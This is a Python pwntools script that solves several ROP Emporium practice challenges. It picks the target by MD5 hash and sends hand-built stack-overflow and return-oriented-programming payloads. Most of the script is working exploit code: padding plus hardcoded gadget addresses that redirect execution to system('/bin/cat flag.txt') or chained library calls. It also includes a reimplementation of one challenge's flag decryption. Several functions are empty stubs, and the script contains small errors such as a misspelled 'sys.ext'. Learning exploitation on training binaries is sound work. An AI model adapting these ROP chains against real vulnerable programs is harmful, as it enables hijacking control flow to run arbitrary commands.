from enum import Enum
#import subprocess
import argparse
import hashlib
import os
import sys
from pwn import *


def ret2win(path):

    payload = b''
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # buffer
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # buffer
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # buffer
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # buffer
    payload += b'\x42\x42\x42\x42\x42\x42\x42\x42' # RBP
    payload += b'\x11\x08\x40\x00\x00\x00\x00\x00' # RIP

    p = process(path)
    p.sendline(payload)
    # p.interactive() if in doubt use interactive() after sendline() ...
    p.recvuntil("Here's your flag:")
    flag = p.recvline()
    success(flag)

    return True

def split(path):

    payload = b''
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # buffer
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # buffer
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # buffer
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # buffer
    payload += b'\x42\x42\x42\x42\x42\x42\x42\x42' # RBP
    payload += b'\x83\x08\x40\x00\x00\x00\x00\x00' # RIP: go to 'pop rdi'
    payload += b'\x60\x10\x60\x00\x00\x00\x00\x00' # value to pop in rdi
    payload += b'\x10\x08\x40\x00\x00\x00\x00\x00' # RIP: got to _system

    p = process(path)
    p.sendline(payload)
    #p.interactive()
    p.recvuntil("Contriving a reason to ask user for data...\n")
    flag = p.recvline()
    success(flag)

    return True

def __check_decryption_algo():
    """
    reimplementation of the decryption algo seen in the "callme" challenge
    :return: decrypted string
    """

    # content of the file "encrypted_flag.txt"
    encrypted_flag = b'\x53\x4d\x53\x41\x7e\x67\x58\x78\x65\x6b\x68\x69\x65\x61\x63\x74'
    encrypted_flag += b'\x74\x60\x4c\x27\x27\x74\x6e\x6c\x7c\x45\x7d\x70\x7c\x79\x3e\x5d'
    encrypted_flag += b'\x21\x0a'

    # key1.dat and key2.dat contains 0x01 -> 0x10 and 0x11 -> 0x20, respectively. Thus:
    key = 1
    decrypted = ''
    for c in encrypted_flag:
        if key <= 0x20:
            decrypted += chr(c^key)
            key += 1


    return decrypted

def callme(path):

    payload = b''
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # buffer
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # buffer
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # buffer
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # buffer
    payload += b'\x42\x42\x42\x42\x42\x42\x42\x42'  # RBP
    payload += b'\xB0\x1A\x40\x00\x00\x00\x00\x00'  # addr "usefulGadgets()": pop edi, esi, edx, ret
    payload += b'\x01\x00\x00\x00\x00\x00\x00\x00'  # param1 for callme_one()
    payload += b'\x02\x00\x00\x00\x00\x00\x00\x00'  # param2 for callme_one()
    payload += b'\x03\x00\x00\x00\x00\x00\x00\x00'  # param3 for callme_one()
    payload += b'\x50\x18\x40\x00\x00\x00\x00\x00'  # plt proc callme_one()
    payload += b'\xB0\x1A\x40\x00\x00\x00\x00\x00'  # addr "usefulGadgets()": pop edi, esi, edx, ret
    payload += b'\x01\x00\x00\x00\x00\x00\x00\x00'  # param1 for callme_two()
    payload += b'\x02\x00\x00\x00\x00\x00\x00\x00'  # param2 for callme_two()
    payload += b'\x03\x00\x00\x00\x00\x00\x00\x00'  # param3 for callme_two()
    payload += b'\x70\x18\x40\x00\x00\x00\x00\x00'  # plt proc callme_two()
    payload += b'\xB0\x1A\x40\x00\x00\x00\x00\x00'  # addr "usefulGadgets()": pop edi, esi, edx, ret
    payload += b'\x01\x00\x00\x00\x00\x00\x00\x00'  # param1 for callme_three()
    payload += b'\x02\x00\x00\x00\x00\x00\x00\x00'  # param2 for callme_three()
    payload += b'\x03\x00\x00\x00\x00\x00\x00\x00'  # param3 for callme_three()
    payload += b'\x10\x18\x40\x00\x00\x00\x00\x00'  # plt proc callme_three()
    payload += b'\x97\x1A\x40\x00\x00\x00\x00\x00'  # proper exit

    p = process(path)
    p.sendline(payload)
    #p.interactive()
    raw = p.recv()
    flag = raw.decode("utf8").split(">")[1].strip() # meh...
    success(flag)

    # bonus
    print(__check_decryption_algo())

    return True

def write4(path):

    payload = b''
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # fill buffer
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # fill buffer
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # fill buffer
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # fill buffer
    payload += b'\x42\x42\x42\x42\x42\x42\x42\x42' # fill buffer (overwrite RSP)

    payload += b'\x90\x08\x40\x00\x00\x00\x00\x00' # pop r14, pop r15, ret
    payload += b'\x60\x10\x60\x00\x00\x00\x00\x00' # r14 -> .bss
    payload += b'\x2f\x62\x69\x6e\x2f\x63\x61\x74' # r15 = "/bin/cat"
    payload += b'\x20\x08\x40\x00\x00\x00\x00\x00' # mov [r14], r15

    payload += b'\x90\x08\x40\x00\x00\x00\x00\x00' # pop r14, pop r15, ret
    payload += b'\x68\x10\x60\x00\x00\x00\x00\x00' # r14 -> .bss+8
    payload += b'\x20\x66\x6c\x61\x67\x2e\x74\x78' # r15 = " flax.tx"
    payload += b'\x20\x08\x40\x00\x00\x00\x00\x00' # mov [r14], r15

    payload += b'\x90\x08\x40\x00\x00\x00\x00\x00' # pop r14, pop r15, ret
    payload += b'\x70\x10\x60\x00\x00\x00\x00\x00' # r14 -> .bss+0x10
    payload += b'\x74\x00\x00\x00\x00\x00\x00\x00' # r15 = "t\x00"
    payload += b'\x20\x08\x40\x00\x00\x00\x00\x00' # mov [r14], r15

    payload += b'\x93\x08\x40\x00\x00\x00\x00\x00' # pop rdi, ret
    payload += b'\x60\x10\x60\x00\x00\x00\x00\x00' # ->"/bin/cat flag.txt"
    payload += b'\x10\x08\x40\x00\x00\x00\x00\x00' # call _system()
    payload += b'\x43\x43\x43\x43\x43\x43\x43\x43' # dummy (stack alignment)
    payload += b'\x79\x06\x40\x00\x00\x00\x00\x00' # hlt

    p = process(path)
    p.sendline(payload)
    fluff = p.recv()
    flag = p.recvline()
    #p.interactive()
    success(flag)

    return True


def badchars():
    pass


def fluff():
    pass


def pivot():
    pass


def ret2csu():
    pass


def __get_file_md5(path):
    """
    Compute the md5 of the target to exploit.
    :param path: Path of a binary file.
    :return: String representation of the computed md5.
    """
    with open(path, "rb") as f:
        raw = f.read()
    return hashlib.md5(raw).hexdigest()


def identify_chall(path):
    """
    Retrieve a "unique" identifier.
    :param path: Absolute path of the binary to exploit.
    :return: Integer used later in the switcher{}.
    """
    # md5 of the different binaries
    challs = Enum("chall",
                  "5749c330b9364a674ab0a2c050584a1a \
                  5122eddf06a4bb23c1e91c0f823ad17e \
                  4d8865be3afafea6bbbf7ccc943c2097 \
                  c592b9b8dcb413fef52937405b6b214d \
                  4f199566bff332a79fc43c2827876afc \
                  0a3b4de9628fc4578ba3d2db3154781a \
                  b9f679c38ddfd6409924997b56afcea8 \
                  2b6e06fb5babcc6787ca30f8a3465e3f")

    md5 = __get_file_md5(path)

    return challs[md5].value


if __name__ == "__main__":

    #  "flag.txt", encrypted things and .so have to be in the ./venv folder

    parser = argparse.ArgumentParser(description="Solutions to ROP Emporium challenges")
    parser.add_argument("binary", help="Target binary to exploit")

    args = parser.parse_args()

    chall_id = 0
    abs_path = ""
    rel_path = args.binary

    # Check path && identify challenge
    if os.path.exists(rel_path):
        abs_path = os.path.abspath(rel_path)
        if len(abs_path) == 0:
            print("Can get abolute path of {}".format(rel_path))
            sys.exit(0)

        chall_id = identify_chall(abs_path)

    if chall_id == 0:
        print("Challenge id not found.")
        sys.ext(0)

    # Switch case according to challenge id, so the correct exploit function is called.
    # https://stackoverflow.com/questions/41698247/executing-functions-within-switch-dictionary/41698287
    switcher = {
        1: lambda: ret2win(abs_path),
        2: lambda: split(abs_path),
        3: lambda: callme(abs_path),
        4: lambda: write4(abs_path),
        5: lambda: badchars(abs_path),
        6: lambda: fluff(abs_path),
        7: lambda: pivot(abs_path),
        8: lambda: ret2csu(abs_path)
    }

    # Call the exploit function relevant to the challenge id
    switcher.get(chall_id)()

